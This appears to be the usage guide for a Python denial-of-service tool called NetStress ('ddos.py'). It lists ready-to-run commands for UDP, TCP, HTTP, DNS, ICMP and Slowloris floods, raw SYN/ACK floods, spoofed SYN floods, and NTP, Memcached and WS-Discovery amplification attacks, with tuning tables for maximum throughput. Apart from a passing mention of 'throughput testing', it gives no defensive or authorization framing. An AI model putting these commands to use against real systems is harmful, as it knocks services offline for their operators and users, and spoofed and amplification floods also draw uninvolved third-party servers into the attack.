# Usage Guide

Complete guide to using NetStress.

## Command Line Interface

### Basic Syntax

```
python ddos.py -i TARGET -p PORT -t PROTOCOL [OPTIONS]
```

### Required Arguments

| Argument     | Description           | Example            |
| ------------ | --------------------- | ------------------ |
| `-i, --ip`   | Target IP or hostname | `-i 192.168.1.100` |
| `-p, --port` | Target port           | `-p 80`            |
| `-t, --type` | Attack protocol       | `-t UDP`           |

### Optional Arguments

| Argument         | Description         | Default |
| ---------------- | ------------------- | ------- |
| `-d, --duration` | Duration in seconds | 60      |
| `-x, --threads`  | Worker threads      | 4       |
| `-s, --size`     | Packet size (bytes) | 1472    |
| `--ai-optimize`  | Enable optimization | Off     |
| `-v, --verbose`  | Verbose output      | Off     |
| `--status`       | Show system status  | -       |

## Protocols

### UDP Flood

High-bandwidth packet flood. Best for throughput testing.

```bash
# Standard UDP
python ddos.py -i TARGET -p 80 -t UDP -d 60

# Maximum throughput
python ddos.py -i TARGET -p 80 -t UDP -s 8192 -x 64 -d 60
```

**Performance:** Up to 16 Gbps with 8192-byte packets.

### TCP Flood

Connection-based flood. Tests connection handling.

```bash
python ddos.py -i TARGET -p 80 -t TCP -x 32 -d 60
```

### HTTP/HTTPS Flood

Application layer flood. Requires running web server.

```bash
# HTTP
python ddos.py -i TARGET -p 80 -t HTTP -x 50 -d 60

# HTTPS
python ddos.py -i TARGET -p 443 -t HTTPS -x 50 -d 60
```

### DNS Flood

DNS query flood.

```bash
python ddos.py -i TARGET -p 53 -t DNS -d 60
```

### ICMP Flood

ICMP echo request flood. Requires administrator privileges.

```bash
python ddos.py -i TARGET -p 0 -t ICMP -d 60
```

### Slowloris

Keeps connections open with partial requests. Effective against Apache.

```bash
python ddos.py -i TARGET -p 80 -t SLOW -x 500 -d 300
```

### Raw Packet Attacks

Require administrator privileges and Scapy.

```bash
# TCP SYN flood
python ddos.py -i TARGET -p 80 -t TCP-SYN -d 60

# TCP ACK flood
python ddos.py -i TARGET -p 80 -t TCP-ACK -d 60

# PUSH-ACK with payload
python ddos.py -i TARGET -p 80 -t PUSH-ACK -s 1024 -d 60

# Spoofed SYN flood
python ddos.py -i TARGET -p 80 -t SYN-SPOOF -d 60
```

### Amplification Attacks

```bash
# NTP amplification
python ddos.py -i TARGET -p 123 -t NTP -d 60

# Memcached amplification
python ddos.py -i TARGET -p 11211 -t MEMCACHED -d 60

# WS-Discovery amplification
python ddos.py -i TARGET -p 3702 -t WS-DISCOVERY -d 60
```

### ENTROPY

High-entropy packet flood with cryptographic payloads (SHA-256 based).

```bash
python ddos.py -i TARGET -p 80 -t ENTROPY -s 4096 -d 60
```

## Performance Optimization

### Packet Size

| Size | Use Case       | Throughput |
| ---- | -------------- | ---------- |
| 64   | High PPS       | Lower      |
| 1472 | MTU optimized  | Medium     |
| 4096 | Balanced       | High       |
| 8192 | Max throughput | Highest    |

### Thread Count

| Threads | CPU Usage | Performance |
| ------- | --------- | ----------- |
| 4-8     | Low       | Basic       |
| 16-32   | Medium    | Good        |
| 32-64   | High      | Maximum     |

### Recommended Configurations

**Maximum throughput:**

```bash
python ddos.py -i TARGET -p 80 -t UDP -s 8192 -x 64 -d 60
```

**Balanced performance:**

```bash
python ddos.py -i TARGET -p 80 -t UDP -s 4096 -x 32 -d 60
```

**Low resource usage:**

```bash
python ddos.py -i TARGET -p 80 -t UDP -s 1472 -x 8 -d 60
```

## System Status

Check available modules:

```bash
python ddos.py --status
```

## Stopping Attacks

Press `Ctrl+C` to stop immediately. The framework will display final statistics.

## Logging

Attack logs are saved to `attack.log`. Audit logs are in `audit_logs/`.
